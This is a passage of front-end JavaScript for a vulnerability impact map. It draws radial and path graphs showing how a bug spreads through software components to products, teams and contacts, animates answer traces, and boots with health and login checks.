  $('legend').innerHTML = [['Vulnerability', '◆ the bug'], ['Component', '● software part'], ['Product', '⬢ product'], ['Team', '▲ team'], ['Person', '● person']]
    .map(([g, l]) => `<span style="color:${COLOR[g]}">${l}</span>`).join('');
  render();
}

// which nodes an answer is about, and in what order to light them
function storyOf(trace) {
  const ok = (trace || []).filter((t) => t.status === 'ok');
  const steps = [];   // [nodeId, prevNodeId]
  let deepest = null;
  ok.forEach((t) => t.paths.slice(0, 8).forEach((p) => {
    const { nodes } = parsePath(p);
    nodes.forEach((n, i) => {
      steps.push([n, nodes[i - 1]]);
      if (n.startsWith('Product:') && (!deepest || i > deepest[1])) deepest = [n, i];
    });
  }));
  const ids = [...new Set([...steps.map((s) => s[0]), ...ok.flatMap((t) => t.touched)])].filter((id) => BASE[id]);
  return { steps, ids, deepest };
}

// radial layout: a tree around the bug. Each branch gets a slice of the
// circle proportional to how many things it reaches, so the spread is visible.
function radialPositions(ids, edges) {
  const set = new Set(ids), adj = {};
  edges.forEach((e) => { (adj[e.from] ||= []).push(e.to); (adj[e.to] ||= []).push(e.from); });
  const center = ids.find((id) => BASE[id].group === 'Vulnerability') || ids.find((id) => BASE[id].group === 'Product') || ids[0];
  const dist = { [center]: 0 }, parent = {}, kids = {}, queue = [center];
  while (queue.length) {
    const n = queue.shift();
    (adj[n] || []).filter((m) => set.has(m)).sort().forEach((m) => {
      if (dist[m] == null) { dist[m] = dist[n] + 1; parent[m] = n; (kids[n] ||= []).push(m); queue.push(m); }
    });
  }
  const orphans = ids.filter((id) => dist[id] == null);           // not connected inside this answer
  const maxD = Math.max(0, ...Object.values(dist));
  orphans.forEach((id) => { dist[id] = maxD + 1; });
  const leaves = {};
  const count = (n) => (leaves[n] = (kids[n] || []).reduce((s, c) => s + count(c), 0) || 1);
  count(center);
  const angle = {}, R = 105;
  const place = (n, from, to) => {
    angle[n] = (from + to) / 2;
    let a = from;
    (kids[n] || []).forEach((c) => { const span = ((to - from) * leaves[c]) / leaves[n]; place(c, a, a + span); a += span; });
  };
  place(center, -Math.PI / 2, (3 * Math.PI) / 2);
  orphans.forEach((id, i) => { angle[id] = (i / Math.max(1, orphans.length)) * 2 * Math.PI; });
  const pos = {};
  ids.forEach((id) => { pos[id] = id === center ? { x: 0, y: 0 } : { x: Math.cos(angle[id]) * dist[id] * R, y: Math.sin(angle[id]) * dist[id] * R }; });
  const productRing = Math.max(0, ...ids.filter((id) => BASE[id].group === 'Product').map((id) => dist[id]));
  return { pos, center, rings: Math.max(...ids.map((id) => dist[id])), R, productRing };
}

// draw one view
function build(view, ids) {
  const keep = ids ? new Set(ids) : null;
  const nodes = FULL.nodes.filter((n) => !keep || keep.has(n.id));
  const set = new Set(nodes.map((n) => n.id));
  const edges = FULL.edges.filter((e) => set.has(e.from) && set.has(e.to));
  EDGE_INDEX = {};
  edges.forEach((e, i) => { EDGE_INDEX[e.from + '|' + e.to] = i; });
  const radial = view === 'radial' ? radialPositions(nodes.map((n) => n.id), edges) : null;
  const initial = keep ? 'dim' : 'base';
  nodesDS = new vis.DataSet(nodes.map((n) => ({
    id: n.id, label: pretty(n.id).name, title: `${pretty(n.id).name}`,
    ...(view === 'path' ? { level: LEVEL[n.id] } : {}),
    ...(radial ? { x: radial.pos[n.id].x, y: radial.pos[n.id].y, fixed: true } : {}),
    ...style(n, view === 'company' && LAST ? (storyOf(LAST).ids.includes(n.id) ? 'hot' : 'base') : initial, view),
  })));
  edgesDS = new vis.DataSet(edges.map((e, i) => ({ id: i, from: e.from, to: e.to, ...edgeStyle(e, view) })));
  const options = {
    physics: view === 'company'
      ? { enabled: true, solver: 'forceAtlas2Based', forceAtlas2Based: { gravitationalConstant: -34, centralGravity: .012, springLength: 55, springConstant: .09, avoidOverlap: .4 },
          stabilization: { iterations: 400, fit: true } }
      : false,
    layout: view === 'path'
      ? { hierarchical: { enabled: true, direction: 'LR', levelSeparation: 185, nodeSpacing: 64, treeSpacing: 46, blockShifting: true, edgeMinimization: true, parentCentralization: true } }
      : { hierarchical: { enabled: false }, randomSeed: 7 },
    edges: { arrows: { to: { enabled: true, scaleFactor: .35 } }, font: { face: 'Geist Mono', size: 10, color: '#22D3EE', strokeWidth: 4, strokeColor: '#07080D' } },
    interaction: { hover: true, tooltipDelay: 100, zoomSpeed: .6 },
  };
  network?.destroy();
  network = new vis.Network($('graph'), { nodes: nodesDS, edges: edgesDS }, options);
  if (view === 'company') network.once('stabilizationIterationsDone', () => { network.setOptions({ physics: false }); network.fit({ animation: { duration: 400 } }); });
  network.on('afterDrawing', () => placeColumns(view));
  if (radial) network.on('beforeDrawing', (ctx) => drawRings(ctx, radial));
  network.fit();
}

function drawRings(ctx, r) {
  const s = network.getScale();          // keep lines and labels crisp at any zoom
  ctx.save();
  const g = ctx.createRadialGradient(0, 0, 0, 0, 0, r.R * 1.4);   // soft glow where the bug sits
  g.addColorStop(0, 'rgba(255,84,112,.22)'); g.addColorStop(1, 'rgba(255,84,112,0)');
  ctx.fillStyle = g; ctx.beginPath(); ctx.arc(0, 0, r.R * 1.4, 0, 2 * Math.PI); ctx.fill();
  for (let k = 1; k <= r.rings; k++) {
    const isProduct = k === r.productRing;
    ctx.beginPath(); ctx.arc(0, 0, k * r.R, 0, 2 * Math.PI);
    ctx.setLineDash(isProduct ? [] : [4 / s, 8 / s]);
    ctx.lineWidth = (isProduct ? 2 : 1) / s;
    ctx.strokeStyle = isProduct ? 'rgba(139,92,246,.55)' : 'rgba(140,147,168,.28)';
    ctx.stroke();
    ctx.setLineDash([]);
    ctx.font = `${11 / s}px Geist`; ctx.fillStyle = isProduct ? 'rgba(167,139,250,.95)' : 'rgba(160,166,186,.75)';
    ctx.fillText(isProduct ? 'your products' : `${k} step${k > 1 ? 's' : ''} from the bug`, 6 / s, -k * r.R - 6 / s);
  }
  ctx.restore();
}

const COLS = [['Vulnerability', 'The bug'], ['Component', 'Software parts it hides in →'], ['Product', 'Your products'], ['Team', 'Team'], ['Person', 'Who to call']];
function placeColumns(view) {
  if (view !== 'path') { $('cols').innerHTML = ''; return; }
  const pos = network.getPositions();
  $('cols').innerHTML = COLS.map(([g, label]) => {
    const xs = Object.entries(pos).filter(([id]) => BASE[id]?.group === g).map(([, p]) => p.x);
    if (!xs.length) return '';
    const x = network.canvasToDOM({ x: g === 'Component' ? (Math.min(...xs) + Math.max(...xs)) / 2 : xs[0], y: 0 }).x;
    return `<span class="absolute -translate-x-1/2 whitespace-nowrap" style="left:${x}px;color:${COLOR[g]}">${label}</span>`;
  }).join('');
}

// light the story up, step by step
function play(story, view) {
  clearInterval(timer);
  const lit = new Set(); let k = 0, hop = 0;
  const finish = () => {
    clearInterval(timer);
    nodesDS.update(nodesDS.getIds().map((id) => ({ id, ...style(BASE[id], 'hot', view) })));
    edgesDS.get().forEach((e) => {
      const lbl = FULL.edges.find((x) => x.from === e.from && x.to === e.to)?.label;
      if (e.width < 3) edgesDS.update({ id: e.id, color: { color: OWNERSHIP.has(lbl) ? 'rgba(139,92,246,.8)' : 'rgba(34,211,238,.5)' }, width: 2 });
    });
  };
  const step = () => {
    if (k >= story.steps.length) return finish();
    const [n, prev] = story.steps[k++];
    hop = prev == null ? 0 : hop + 1;
    if (BASE[n] && !lit.has(n)) { lit.add(n); nodesDS.update({ id: n, ...style(BASE[n], 'hot', view) }); }
    const e = prev != null ? (EDGE_INDEX[prev + '|' + n] ?? EDGE_INDEX[n + '|' + prev]) : null;
    if (e != null && edgesDS.get(e).width < 3) edgesDS.update({ id: e, color: { color: '#22D3EE' }, width: 3.5, label: view === 'path' ? String(hop) : '' });
  };
  if (matchMedia('(prefers-reduced-motion: reduce)').matches) { while (k < story.steps.length) step(); finish(); }
  else timer = setInterval(step, 140);
}

function render() {
  if (!graphReady) return;
  clearInterval(timer);
  const view = LAST ? VIEW : 'company';
  const story = LAST ? storyOf(LAST) : null;
  if (view === 'company' || !story?.ids.length) {
    build('company', null);
    $('hopinfo').textContent = '';
  } else {
    build(view, story.ids);
    play(story, view);
    const d = story.deepest;
    $('hopinfo').textContent = d ? `How the bug reaches ${pretty(d[0]).name}` : '';
  }
  document.querySelectorAll('[data-view]').forEach((b) => {
    const on = b.dataset.view === view, needs = b.dataset.view !== 'company' && !story?.ids.length;
    b.disabled = needs;
    b.title = needs ? 'Ask about a bug first' : '';
    b.style.cssText = on ? 'background:var(--raised);color:var(--fg);border-color:var(--line2)' : '';
  });
}
document.querySelectorAll('[data-view]').forEach((b) => b.onclick = () => { VIEW = b.dataset.view; render(); });
function showAnswer(trace) {
  if (!storyOf(trace).ids.length) return;
  LAST = trace;
  if (VIEW === 'company') VIEW = 'path';
  render();
}
function resetMap() { LAST = null; VIEW = 'company'; render(); }
new ResizeObserver(() => { if (network) { network.redraw(); network.fit(); } }).observe($('graph'));

// boot
(async function boot() {
  try {
    const h = await (await fetch('/api/health')).json();
    if (!h.falkordb.ok) toast('⚠ The graph database is not reachable', 6000);
    GEMINI_OK = !!h.gemini;
  } catch { toast('⚠ Server unreachable', 6000); }
  loadGraph().catch(() => { $('graph').innerHTML = '<p class="p-4 text-xs text-faint">Map unavailable.</p>'; });
  if (!store.get('token')) return showLogin();
  try { enter(await api('/api/me'), false); } catch { showLogin(); }
})();
